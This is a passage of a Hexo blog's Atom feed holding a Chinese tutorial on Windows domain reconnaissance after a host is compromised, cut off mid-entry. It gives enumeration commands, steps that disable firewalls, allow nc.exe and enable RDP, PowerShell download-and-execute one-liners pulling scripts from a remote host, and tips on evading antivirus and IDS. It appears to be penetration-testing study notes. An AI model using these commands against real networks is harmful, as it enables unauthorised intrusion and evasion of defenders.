<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>偷得浮生半日闲</title>
  
  <subtitle>再偷浮生两吊钱</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.xpshuai.cn/"/>
  <updated>2020-05-08T03:26:48.716Z</updated>
  <id>http://www.xpshuai.cn/</id>
  
  <author>
    <name>浮生</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>内网第二章-内网基础信息搜集</title>
    <link href="http://www.xpshuai.cn/%E5%86%85%E7%BD%91%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>http://www.xpshuai.cn/内网第二章-内网基础信息搜集/</id>
    <published>2020-05-08T03:21:55.000Z</published>
    <updated>2020-05-08T03:26:48.716Z</updated>
    
    <content type="html"><![CDATA[<h1 id="二-内网信息收集"><a href="#二-内网信息收集" class="headerlink" title="二 . 内网信息收集"></a>二 . 内网信息收集</h1><h4 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title=" 本机信息收集 "></a><font color="red"> 本机信息收集 </font></h4><p><strong>1)查询网络配置</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net view    # 查看工作组</span><br><span class="line"></span><br><span class="line">ipconfig /all   # 也可以看到是否有域</span><br></pre></td></tr></table></figure></p><p><strong>2) 查询用户列表</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user   # 查看本机用户列表</span><br><span class="line">net localgroup administrators   # 本机管理员（通常含有域用户）</span><br><span class="line">query user || qwinsta   # 查看当前在线用户（提前看看管理员是否在线）</span><br><span class="line"></span><br><span class="line"># 企事业单位的用户名有规则性</span><br></pre></td></tr></table></figure></p><p><strong>3)查询进程列表</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 看装了什么软件,vpn,杀毒软件,虚拟机,某服务(推敲域内是否都装了这个软件)</span><br><span class="line"># 看进程运行的权限</span><br><span class="line"></span><br><span class="line">tasklist /v</span><br><span class="line"># 或用wmic</span><br><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure></p><p><strong>4) 查看本机服务信息</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure></p><p><strong>5) 查询操作系统及安装软件版本信息</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 获取操作系统和版本信息()</span><br><span class="line">systeminfo |findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;   # 英文版本的话是这样</span><br><span class="line">systeminfo |findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;       # 中文版本的话是这样</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 查看系统体系结构</span><br><span class="line">echo  %PROCESSOR_ARCHITECTURE%  # amd64</span><br><span class="line"></span><br><span class="line"># 查看安装软件和版本、路径等</span><br><span class="line">wmic product get name,version</span><br><span class="line"># powershell查看安装软件信息</span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure></p><p><strong>6) 查询端口列表</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line"># 根据端口综合判断，如果是内容用来更新的服务器/DNS服务器/代理服务器</span><br></pre></td></tr></table></figure></p><p><strong>7) 查询启动信息</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get <span class="built_in">command</span>,caption</span><br></pre></td></tr></table></figure></p><p><strong>8) 查看计划任务</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure></p><p><strong>9) 查看主机开机时间</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure></p><p><strong>10) 列出或断开本地计算机与所连接的客户端之间的会话</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure></p><p><strong>11) 查询补丁信息</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systeminfo   #可以看到很多信息(域内主机补丁是批量打的)</span><br><span class="line"></span><br><span class="line"># 或用wmic</span><br><span class="line">wmic qfe get Caption,Description,HostFixID,InstalledOn</span><br></pre></td></tr></table></figure></p><p><strong>12) 查询本机共享</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 默认是开着C，IPC，ADMINS</span><br><span class="line"># 不单单是看本机的信息(通过本机判断域内情况)</span><br><span class="line">net share</span><br><span class="line"></span><br><span class="line">net share \\yourHostname</span><br><span class="line"></span><br><span class="line">wmic share get name,path,status</span><br><span class="line"></span><br><span class="line"># wmic： 是windows自带的一个命令工具，有很多功能(交互/非交互模式)</span><br></pre></td></tr></table></figure></p><p><strong>13) 查询路由表和所有可用的ARP缓存表</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">route <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure></p><p><strong>14) 查询防火墙配置</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># '查看'防火墙配置</span></span><br><span class="line">netsh firewall show config</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## '关闭'防火墙(msf里面也有)</span></span><br><span class="line"><span class="comment">#1.对win server 2003以及之前的版本</span></span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode <span class="built_in">disable</span></span><br><span class="line"><span class="comment">#2.win server 2003之后的版本</span></span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义防火墙日志储存位置</span></span><br><span class="line">netsh advfirewall <span class="built_in">set</span> currentprofile logging filename <span class="string">"C:\windows\temp/fw.log"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## '修改'防火墙相关配置(比关闭防火墙动静小，改完记得恢复规则)</span></span><br><span class="line"><span class="comment">#1.对win server 2003以及之前的版本,允许指定程序全部连接</span></span><br><span class="line">netsh firewall add allowprogram c:\nc.exe <span class="string">"allow nc"</span> <span class="built_in">enable</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.win server 2003之后的版本</span></span><br><span class="line">允许指定程序连入</span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">"pass nc"</span> dir=<span class="keyword">in</span> action=allow program=<span class="string">"C: \nc.exe"</span></span><br><span class="line">允许指定程序连出</span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">"Allow nc"</span> dir=out action=allow program=<span class="string">"C: \nc.exe"</span></span><br><span class="line">允许3389端口放行</span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">"Remote Desktop"</span> protocol=TCP dir=<span class="keyword">in</span> localport=3389  action=allow</span><br></pre></td></tr></table></figure></p><p><strong>15) 查看代理配置情况</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"</span></span><br></pre></td></tr></table></figure></p><p><strong>16) 查询并开启远程连接服务（比较老的知识点）</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">##### 查看远程连接端口</span><br><span class="line">Reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">###### 开启的3389方法：</span><br><span class="line"># 1.通用 开3389(优化后)：</span><br><span class="line">  wmic RDTOGGLE WHERE ServerName=&apos;%COMPUTERNAME%&apos; call SetAllowTSConnections 1</span><br><span class="line">  </span><br><span class="line"># 2.For Win2003:</span><br><span class="line">  REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">  # 或者</span><br><span class="line">  wimc path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowsconnections 1</span><br><span class="line">  </span><br><span class="line"># 3.For Win2008:</span><br><span class="line">  REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">  </span><br><span class="line"># 4.For Every:</span><br><span class="line">  cmd开3389 win08 win03 win7 win2012 winxp</span><br><span class="line">  # win08，三条命令；win2012通用；win7前两条即可(权限需要run as administrator):</span><br><span class="line">  wmic /namespace:\root\cimv2 erminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1</span><br><span class="line">  wmic /namespace:\root\cimv2 erminalservices path win32_tsgeneralsetting where (TerminalName =&apos;RDP-Tcp&apos;) call setuserauthenticationrequired 1</span><br><span class="line">  reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></p><p><strong>17) 自动化信息搜集</strong></p><ul><li>写一个脚本，把上面要搜集的信息都进行</li><li>WMIC(win管理工具命令行)的搜集信息的写好的脚本(执行该脚本后，会自动生成一个html文件) <a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar" target="_blank" rel="noopener">链接</a></li></ul><p><strong>18) Empire下的主机信息搜集</strong><br>1.Empire提供了用于收集主机信息的模块，输入命令<code>usemodoule situational_awareness/host/winenum</code>即可看到一些信息<br>2.<code>usemodoule situational_awareness/host/computerdetails</code> 包含了几乎所有有用的东西(但是运行这个模块需要管理员权限)</p><h4 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title=" 查询当前权限 "></a><font color="red"> 查询当前权限 </font></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami    <span class="comment"># 查询当前权限</span></span><br></pre></td></tr></table></figure><p><strong>获取到一台主机的权限后，有如下三种情况：</strong></p><ul><li>本地普通用户</li><li>本地管理员用户     （可以用来查询域内信息, 比如： <code>net view /xx/yy</code>）</li><li>域内用户(域名\用户)</li></ul><p>本地管理员权限默认和直接提升为Ntauthority或System权限，因此，在域中，除普通用户外，所有的机器都有一个机器用户(用户名是机器名+$)。本质上，机器的system用户对应的就是域里面的机器用户，所以使用system权限可以运行域内的查询命令  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami /all    <span class="comment"># 获取域SID  </span></span><br><span class="line">net user xxx /domain  <span class="comment"># 查询指定用户的详细信息</span></span><br></pre></td></tr></table></figure><h4 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title=" 判断是否存在域 "></a><font lor="red"> 判断是否存在域 </font></h4><p>如果存在域，就需要判断所控主机是否在域内  </p><p>几种方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 1.</span><br><span class="line">ipconfig /all  # 可以查看网关IP地址、DNS的ip地址、域名、本机是否和dns处在同一网段</span><br><span class="line"># 然后，可以通过nslookup反解析域名的ip地址，用解析得到的ip地址进行对比，判断DC和DNS是否在同一台服务器上</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 2.查看系统详细信息(有&quot;域&quot;的字段)，如果&quot;域&quot;为WORKGROUP则表示当前服务器不在域内</span><br><span class="line">systeminfo </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 3.查询当前登录域及登录用户信息(&quot;工作站域DNS名称&quot;为域名，如果为WORKGROUP则表示当前为非域环境)</span><br><span class="line"># &quot;登录域&quot;表示当前登录的用户是域用户还是本地用户</span><br><span class="line">net config workstation</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 4.判断主域(域服务器通常会作为时间服务器使用)</span><br><span class="line">net time /domain</span><br><span class="line">    # 三种情况：</span><br><span class="line">    1.存在域，当前用户不是域用户</span><br><span class="line">    2.存在域，当前用户是域用户</span><br><span class="line">    3.当前网络环境为工作组，不存在域</span><br></pre></td></tr></table></figure></p><h4 id="域内存活主机探测"><a href="#域内存活主机探测" class="headerlink" title=" 域内存活主机探测 "></a><font color="red"> 域内存活主机探测 </font></h4><ol><li>避免除法防病毒软件报警</li><li>不要使用暴力的;</li><li>不要使用图形化的工具</li><li>使用powershell/vbs等自带的</li><li>白天上班时间探测一遍，深夜分别探测一遍（对比分析存活主机对应的IP地址i）</li></ol><p><strong>1.利用<code>netbios</code>快速探测</strong>   （优先使用这个协议,会被认为是正常的通信）<br>工具：<code>nbtbios</code><br>使用方法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># win和Linux下都有</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里用win版本的，上传到目标主机(推荐放到目标机器的windows/temp下面)</span></span><br><span class="line">nbtscan.exe 192.168.111/24</span><br></pre></td></tr></table></figure></p><p>参数说明(结果的第三列)：<br><img src="/内网第二章-内网基础信息搜集/20200307145109927_29873.png" alt></p><p><strong>2.利用<code>icmp</code>协议快速探测内网</strong><br>工具：<br>1.ping命令:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for循环ping整个网段</span></span><br><span class="line"><span class="keyword">for</span> /L %l <span class="keyword">in</span> (1,1,254) Do @ping -w 1 -n 192.168.111.%l |findstr <span class="string">"TTL="</span></span><br></pre></td></tr></table></figure></p><p>2.VBS脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">没写</span><br><span class="line"></span><br><span class="line"><span class="comment"># cscript xxx.vbs 运行脚本</span></span><br></pre></td></tr></table></figure></p><p><strong>3.利用<code>arp</code>扫描完整探测内网</strong><br>工具：<br>1.arp-scan<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 上传arp.exe 到目标机器运行</span></span><br><span class="line">Arp.exe -t 192.168.0/20</span><br></pre></td></tr></table></figure></p><p>2.Empire中的arpscan模块<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness/net/work/arpscan</span><br><span class="line"><span class="built_in">set</span> ...</span><br><span class="line">execute</span><br></pre></td></tr></table></figure></p><p>3.NiShang里面的脚本: <code>Invoke-ARPScan.ps1</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a.远程下载运行</span></span><br><span class="line">powershell -nop -<span class="built_in">exec</span> bypass -c <span class="string">"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.1/Invoke-ARPScan.ps1');Invoke-ARPScan -CIDR 192.168.1.0/20"</span> &gt;&gt; C:\windows\temp\log.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># b.本地运行(先上传脚本到目标)</span></span><br><span class="line">powershell.exe -nop -<span class="built_in">exec</span> bypass -Command <span class="string">"&amp;&#123;Import-Module C:\windows\temp\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/20&#125;"</span> &gt;&gt; C:\windows\temp\log.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># c.无条件运行(没痕迹)</span></span><br></pre></td></tr></table></figure></p><p>3.利用常规<code>tcp/udp端口扫描</code>探测内网<br>工具：<code>scanline</code>   (比较老, 但是好用，可在所有win版本使用，动静小)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -t 是tcp端口， -u是udp端口</span></span><br><span class="line">sl -h -t 22,80-89,110,389,445,3389,1099,1433,6379,27017,7001,8080,1521,3306,5432 -u 53,161,137,139 -O c:\windows\temp\sl_res.txt -p 192.168.1.1-254 /b</span><br></pre></td></tr></table></figure></p><h4 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title=" 扫描域内端口 "></a><font color="red"> 扫描域内端口 </font></h4><p>通过端口，不仅能了解目标主机所开放的服务，还能找出其开放服务的漏洞、分析目标网络的拓扑结构等</p><ul><li>端口的banner信息</li><li>端口上运行的服务</li><li>常见应用的默认端口</li></ul><p><strong>工具：</strong></p><ul><li><p>1.telent命令(针对单个，肯定不会触发报警)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet DC1 22  <span class="comment"># 查看某台主机某个端口是否开放</span></span><br></pre></td></tr></table></figure></li><li><p>2.S扫描器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 早期的工具，支持大网段</span></span><br><span class="line">S.exe TCP 192.168.1.1 192.168.1.112  22,445,3389,1433,6379,8080,80,23,21,25,110,3306,1521,111,445,7001  256  /Banner /save</span><br><span class="line"><span class="comment"># 结果默认保存在安装目录下的result.txt文件中</span></span><br></pre></td></tr></table></figure></li><li><p>3.Metasploit内置的端口扫描模块:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search portscan</span><br><span class="line">use auxiliary/scanner/portscan/tcp  <span class="comment"># 还有其他模块</span></span><br><span class="line"><span class="built_in">set</span> ...</span><br><span class="line">run</span><br></pre></td></tr></table></figure></li><li><p>4.PowerSploit下的<code>Invoke-portscan.ps1</code>脚本 (不会下载到本地)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -<span class="built_in">exec</span> bypass -c <span class="string">"IEX(New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1');Invoke-portscan -Hosts 192.168.1.0/24 -T 4 -ports '445,1433,5432,8080,3389,22' -oA C:\windows\temp\log.txt"</span></span><br></pre></td></tr></table></figure></li><li><p>5.NiShang的<code>Invoke-PortScan</code>模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-Help Invoke-PortScan -full</span><br><span class="line"><span class="comment"># ResolveHost 解析主机名</span></span><br><span class="line">Invoke-PortScan -StartAddress 192.168.0.1 -StopAddress 192.168.0.255 -ResolveHost</span><br></pre></td></tr></table></figure></li><li><p>6.nmap</p></li><li>7.masscan</li><li>8.其他端口扫描工具</li></ul><blockquote><p>注意扫描是否会触发IDS等设备</p></blockquote><p><strong>端口Banner信息</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过扫描发现了端口，可以使用客户端连接工具或nc，获取服务端的Banner信息 </span><br><span class="line">获取Banner信息之后，可以在漏洞库中查找相应的CVE编号的POC/Exp, 在Exploit-DB、Seebug、安全焦点的BugTraq 等平台查看相关漏洞利用工具，然后到目标系统中验证漏洞是否存在，从而有针对性地进行安全加固</span><br></pre></td></tr></table></figure></p><p><strong>常见端口机器攻击方向</strong>：<br><a href="http://www.xpshuai.cn/01-信息搜集/#4.%20收集常用端口信息">链接</a></p><h4 id="收集域内基础信息"><a href="#收集域内基础信息" class="headerlink" title=" 收集域内基础信息 "></a><font color="red"> 收集域内基础信息 </font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 域用户才有权限进行以下查询（本机的system权限也可以，机器的用户名+$）</span><br><span class="line"></span><br><span class="line"># 查询域</span><br><span class="line">net view /domain  </span><br><span class="line"># 查询域内所有计算机(可通过主机名对主机角色进行初步判定, 比如web可能是web服务器)</span><br><span class="line">net view /domain:domainName   </span><br><span class="line">net view /domain:WORKGROUP   </span><br><span class="line"></span><br><span class="line"># 查看域内所有用户组</span><br><span class="line">net group /domain    </span><br><span class="line"></span><br><span class="line"># 查看域成员计算机列表</span><br><span class="line">net group &quot;domain computers&quot; /domain   </span><br><span class="line"></span><br><span class="line"># 获取域密码信息(密码策略,密码长度,错误锁定等信息)</span><br><span class="line">net accounts /domain   </span><br><span class="line"></span><br><span class="line">#  获取域信任信息</span><br><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure><h4 id="查找-域控制器-DC"><a href="#查找-域控制器-DC" class="headerlink" title="查找 域控制器(DC) "></a><font color="red">查找 域控制器(DC) </font></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看DC的机器名</span></span><br><span class="line">nltest /DCLIST:xxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看DC的主机名</span></span><br><span class="line">nslookup -<span class="built_in">type</span>=SRV _ldap._tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前时间</span></span><br><span class="line">net time /domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看域控制器组</span></span><br><span class="line">net group <span class="string">"Domain Controllers"</span>/domain</span><br><span class="line"></span><br><span class="line">netdom query pdc</span><br></pre></td></tr></table></figure><h4 id="域内用户和管理员的获取"><a href="#域内用户和管理员的获取" class="headerlink" title=" 域内用户和管理员的获取  "></a><font color="red"> 域内用户和管理员的获取  </font></h4><p>1.查询所有域用户列表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">net user /doamin    # 向DC进行查询域用户列表</span><br><span class="line">wmic useraccount get /all   # 获取域内用户详细信息</span><br><span class="line">dsquery user  # 查看存在的用户</span><br><span class="line"># 常用的dsquery命令</span><br><span class="line">dsquery computer # 查找目录中的计算机</span><br><span class="line">dsquery contact  # 查找目录中的联系人</span><br><span class="line">dsquery subnet   # 查找目录中的子网</span><br><span class="line">dsquery group    # 查找目录中的组</span><br><span class="line">dsquery ou       # 查找目录中的组织单位</span><br><span class="line">dsquery site     # 查找目录中的站点</span><br><span class="line">dsquery user     # 查找目录中的用户</span><br><span class="line">dsquery quota     # 查找目录中的配额规定</span><br><span class="line">dsquery partition  # 查找目录中的分区</span><br><span class="line">dsquery * -     # 用通用的 LDAP 查询来查找目录中的任何对象</span><br><span class="line"></span><br><span class="line">net localgroup administrators  # 查询本地管理员组用户(实际中，为了方便管理，会有域用户被设置为域机器的本地管理员用户)</span><br></pre></td></tr></table></figure></p><p>2.查询域管理员用户组<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询域管理员用户</span></span><br><span class="line">net group <span class="string">"doamin admins"</span> /domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询域管理员用户组</span></span><br><span class="line">net group <span class="string">"Enterprise Admins"</span> /domain</span><br></pre></td></tr></table></figure></p><h4 id="定位域管理员-很重要"><a href="#定位域管理员-很重要" class="headerlink" title="定位域管理员 (很重要)  "></a><font color="red">定位域管理员 (很重要)  </font></h4><p>当一台机器加入域后，会默认给域管理员组赋予本地系统管理员权限</p><h6 id="常规定位域内管理员方法："><a href="#常规定位域内管理员方法：" class="headerlink" title="常规定位域内管理员方法："></a>常规定位域内管理员<code>方法</code>：</h6><blockquote><p>第二种方法使用较多</p></blockquote><ol><li>日志 （本地机器的管理员日志，可以使用<code>脚本</code>或<code>wevtuti</code>l导出并查看）</li><li>会话 （域内每个机器的等会会话，可以匿名查询，无需权限，可以使用<code>netess.exe</code>或<code>powerview</code>等工具查询）</li></ol><h6 id="常用的定位域管理员工具："><a href="#常用的定位域管理员工具：" class="headerlink" title="常用的定位域管理员工具："></a>常用的定位域管理员<code>工具</code>：</h6><p>1.psloggedon.exe<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载地址：https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</span></span><br><span class="line"><span class="comment"># 查看本地登录的用户 和 通过本地计算机或远程计算机的资源登录的用户</span></span><br><span class="line"><span class="comment"># 如果指定的是"用户名"而不是计算机名，则会搜索网上邻居的计算机，并显示该用户当前是否已经登录</span></span><br><span class="line"><span class="comment"># 某些功能需要管理员权限</span></span><br><span class="line"></span><br><span class="line">psloggedon \\DC1</span><br><span class="line"><span class="comment"># - 显示支持的选项和用于输出值的单位</span></span><br><span class="line"><span class="comment"># -l  仅显示本地登录，不显示本地和网络资源登录</span></span><br><span class="line"><span class="comment"># -x  不显示登录时间</span></span><br><span class="line"><span 